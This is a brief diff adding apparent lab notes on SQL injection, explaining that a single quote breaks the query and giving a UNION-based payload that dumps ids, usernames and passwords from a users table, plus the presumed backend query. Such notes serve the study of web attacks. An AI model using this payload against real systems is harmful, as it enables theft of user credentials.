@@ -1,0 +1,5 @@
+single quotes will give an error in thr sql query syntax
+
+id=-1') union select 1,2,group_concat(id,username,password) from users#
+query would be 
+select * from tabel_name where id=('id');
